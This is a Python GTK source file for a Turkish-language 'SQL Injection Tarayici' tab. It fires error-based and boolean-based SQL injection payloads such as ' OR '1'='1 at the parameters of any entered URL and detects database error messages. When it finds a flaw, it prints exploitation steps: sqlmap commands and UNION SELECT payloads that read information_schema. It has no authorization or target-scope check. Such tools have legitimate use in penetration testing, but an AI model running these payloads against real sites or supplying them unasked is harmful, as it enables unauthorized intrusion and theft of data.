import gi
gi.require_version("Gtk", "3.0")
from gi.repository import Gtk, GLib
import threading
import requests
import re


class SqlInjectionTab(Gtk.Box):
    def __init__(self):
        super().__init__(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        self.set_border_width(24)

        title = Gtk.Label(label="SQL Injection Tarayici")
        title.get_style_context().add_class("title-label")
        title.set_xalign(0)
        self.pack_start(title, False, False, 0)

        desc = Gtk.Label(label="Hedef URL'deki parametreleri SQL injection zafiyetlerine karsi test eder. Error-based ve boolean-based teknikler kullanir.")
        desc.get_style_context().add_class("desc-label")
        desc.set_line_wrap(True)
        desc.set_xalign(0)
        self.pack_start(desc, False, False, 0)

        sep = Gtk.Separator()
        self.pack_start(sep, False, False, 4)

        frame = Gtk.Frame(label="Hedef URL")
        input_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=8)
        input_box.set_border_width(16)

        lbl = Gtk.Label(label="Ornek: http://site.com/page.php?id=1")
        lbl.set_xalign(0)
        lbl.get_style_context().add_class("desc-label")
        input_box.pack_start(lbl, False, False, 0)

        hbox = Gtk.Box(spacing=8)
        hbox.set_halign(Gtk.Align.CENTER)
        self.entry = Gtk.Entry(placeholder_text="http://hedef-site.com/sayfa.php?id=1")
        self.entry.set_size_request(500, 30)
        self.entry.connect("activate", lambda _: self.start_scan())
        hbox.pack_start(self.entry, False, False, 0)
        self.scan_btn = Gtk.Button(label="Tara")
        self.scan_btn.connect("clicked", lambda _: self.start_scan())
        self.scan_btn.get_style_context().add_class("suggested-action")
        hbox.pack_start(self.scan_btn, False, False, 0)
        input_box.pack_start(hbox, False, False, 0)

        frame.add(input_box)
        self.pack_start(frame, False, False, 0)

        self.textview = Gtk.TextView()
        self.textview.set_editable(False)
        self.textview.set_monospace(True)
        self.textview.get_style_context().add_class("output-text")
        self.textbuffer = self.textview.get_buffer()
        sw = Gtk.ScrolledWindow()
        sw.set_policy(Gtk.PolicyType.AUTOMATIC, Gtk.PolicyType.AUTOMATIC)
        sw.set_vexpand(True)
        sw.add(self.textview)
        self.pack_start(sw, True, True, 0)

        self.status_label = Gtk.Label(label="")
        self.status_label.set_xalign(0)
        self.pack_start(self.status_label, False, False, 0)

        self.running = False

    def log(self, text):
        GLib.idle_add(self._append, text)

    def _append(self, text):
        end = self.textbuffer.get_end_iter()
        self.textbuffer.insert(end, text + "\n")

    def start_scan(self):
        url = self.entry.get_text().strip()
        if not url:
            self.status_label.set_text("URL girin")
            return
        if self.running:
            return
        if "?" not in url or "=" not in url.split("?")[1]:
            self.status_label.set_text("URL'de parametre olmali (ornek: ?id=1)")
            return
        self.running = True
        self.scan_btn.set_sensitive(False)
        self.textbuffer.set_text("")
        self.status_label.set_text("SQL injection testi yapiliyor...")
        thread = threading.Thread(target=self.scan, args=(url,), daemon=True)
        thread.start()

    def scan(self, url):
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Accept": "text/html,*/*",
        }

        error_patterns = [
            (r"SQL syntax.*MySQL", "MySQL"),
            (r"Warning.*mysql_.*", "MySQL"),
            (r"MySQLSyntaxErrorException", "MySQL"),
            (r"valid MySQL result", "MySQL"),
            (r"PostgreSQL.*ERROR", "PostgreSQL"),
            (r"Warning.*\Wpg_.*", "PostgreSQL"),
            (r"valid PostgreSQL result", "PostgreSQL"),
            (r"Driver.*SQL Server", "MSSQL"),
            (r"OLE DB.*SQL Server", "MSSQL"),
            (r"SQL Server.*Driver", "MSSQL"),
            (r"SQL error.*SQLite", "SQLite"),
            (r"SQLite3::", "SQLite"),
            (r"Oracle.*DRIVER", "Oracle"),
            (r"ORA-[0-9]{5}", "Oracle"),
            (r"Oracle error", "Oracle"),
            (r"JDBC.*Oracle", "Oracle"),
        ]

        payloads_single = [
            ("'", "Tek tirnak"),
            ('"', "Cift tirnak"),
            ("')", "Tirnak + parantez"),
            ("'-- -", "Tek tirnak + yorum"),
            ("'#", "Tek tirnak + hash yorum"),
        ]

        payloads_boolean = [
            ("' OR '1'='1", "OR 1=1 (tek tirnak)"),
            ("' OR '1'='2", "OR 1=2 (tek tirnak - farkli)"),
            ('" OR "1"="1', 'OR 1=1 (cift tirnak)'),
            ('" OR "1"="2', 'OR 1=2 (cift tirnak - farkli)'),
            ("' OR 1=1-- -", "OR 1=1 yorum"),
            ("' OR 1=2-- -", "OR 1=2 yorum (farkli)"),
            ("' AND 1=1-- -", "AND 1=1 yorum"),
            ("' AND 1=2-- -", "AND 1=2 yorum (farkli)"),
        ]

        try:
            self.log(f"[*] Hedef: {url}")
            self.log(f"[*] Test baslatiliyor...\n")

            base_resp = requests.get(url, timeout=10, headers=headers)
            base_len = len(base_resp.text)
            base_status = base_resp.status_code
            self.log(f"[*] Normal yanit: {base_status} ({base_len} byte)\n")

            self.log("=== Error-Based Test ===")
            vulnerable = False
            for payload, desc in payloads_single:
                test_url = url + payload
                try:
                    resp = requests.get(test_url, timeout=10, headers=headers)
                    found = False
                    for pattern, db in error_patterns:
                        if re.search(pattern, resp.text, re.IGNORECASE):
                            self.log(f"  [!!!] ZAFIYET BULUNDU! Payload: {desc}")
                            self.log(f"        Veritabani: {db}")
                            self.log(f"        Payload: {payload}")
                            self.log(f"        Yanit: {resp.status_code} ({len(resp.text)} byte)")
                            vulnerable = True
                            found = True
                            break
                    if not found:
                        self.log(f"  [-] {desc}: Temiz")
                except Exception as e:
                    self.log(f"  [-] {desc}: Hata - {e}")

            self.log("")
            self.log("=== Boolean-Based Test ===")
            diff_found = False
            for payload, desc in payloads_boolean:
                try:
                    resp = requests.get(url + payload, timeout=10, headers=headers)
                    diff = len(resp.text) - base_len
                    if abs(diff) > 50:
                        self.log(f"  [?] {desc}: Farkli yanit ({diff:+d} byte)")
                        diff_found = True
                    else:
                        self.log(f"  [-] {desc}: Ayni yanit")
                except Exception as e:
                    self.log(f"  [-] {desc}: Hata - {e}")

            self.log("")
            self.log("=== SONUC ===")
            if vulnerable:
                self.log("  [!!!] SQL Injection ZAFIYETI TESPIT EDILDI!")
                self.log("  Nasil istismar edilir:")
                self.log("  1. sqlmap -u \"" + url + "\" --batch")
                self.log("  2. Manuel: ' UNION SELECT 1,2,3,4...-- -")
                self.log("  3. Veritabani bilgilerini cikarmak icin:")
                self.log("     ' UNION SELECT table_name FROM information_schema.tables-- -")
            elif diff_found:
                self.log("  [?] Boolean-based zafiyet olabilir (manuel kontrol gerekli)")
                self.log("  Oneri: sqlmap -u \"" + url + "\" --level 3 --risk 2")
            else:
                self.log("  [-] SQL injection zafiyeti bulunamadi")
                self.log("  Not: WAF/IDS varsa false negative olabilir")
                self.log("  Oneri: sqlmap ile detayli tarama yapin")

        except requests.exceptions.ConnectionError:
            self.log("[-] Baglanti kurulamadi")
        except Exception as e:
            self.log(f"[-] Hata: {e}")

        GLib.idle_add(self.finish)

    def finish(self):
        self.running = False
        self.scan_btn.set_sensitive(True)
        self.status_label.set_text("Tarama tamamlandi")
